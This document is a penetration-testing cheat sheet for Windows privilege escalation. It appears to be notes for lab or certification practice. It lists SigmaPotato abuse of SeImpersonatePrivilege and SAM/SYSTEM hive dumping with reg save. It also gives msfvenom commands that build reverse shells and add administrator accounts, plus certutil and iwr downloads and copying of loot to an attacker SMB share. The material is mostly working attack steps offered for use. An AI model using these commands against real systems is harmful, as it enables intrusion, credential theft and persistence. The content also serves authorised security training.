# Special Privileges

## Kernel Exploits

```powershell
systeminfo    # OS version and build
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

Check: [https://msrc.microsoft.com/](https://msrc.microsoft.com/)

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

***

## SeImpersonatePrivilege — SigmaPotato

Commonly found when exploiting IIS or other Windows services (LocalService, NetworkService, ApplicationPoolIdentity).

```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
.\SigmaPotato.exe "<command>"
```

***

## SeBackupPrivilege — Extract SAM/SYSTEM Hive

```cmd
reg save HKLM\system system.save
reg save HKLM\sam sam.save
```

**Elevated file copy with robocopy:**

```cmd
robocopy /B C:\Users\enterpriseadmin\Desktop C:\Users\enterpriseuser\Desktop flag.txt
```

***

## SeShutDownPrivilege — Force System Reboot

This privilege can be used in binary or DLL hijacking scenarios.

`shutdown /r /t 0`&#x20;

If the above does not work due to a privilege error  `psshutdown64.exe` from sysinternals can be used as follows:

`.\psshutdown64.exe -accepteula -r /t 0`

## Windows Commands Cheatsheet

**msfvenom payloads:**

```bash
# Add user
msfvenom -p windows/x64/adduser USER=misthos PASS=password123 -f exe -o adduser.exe

# Execute command
msfvenom -p windows/exec CMD='cmd.exe /c net user misthos Password123! /ADD & net localgroup administrators misthos /ADD' -f exe -o payload.exe

# Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o payload.dll
```

**File transfer to Windows:**

```cmd
# certutil (native)
certutil -urlcache -f http://<ip>/file.exe file.exe
```

```powershell
# PowerShell iwr
iwr -uri http://<ip>/file.exe -Outfile file.exe
# PowerShell wget
powershell wget -Uri <url> -Outfile file.exe
```

**File transfer from Windows to Kali (SMB server):**

```bash
# Kali — start authenticated SMB server
impacket-smbserver share //tmp/loot -smb2support -username pt -password pt
```

```cmd
# Windows — connect and copy
net use \\<kali-ip>\share /user:pt pt
copy file.txt \\<kali-ip>\share\
```
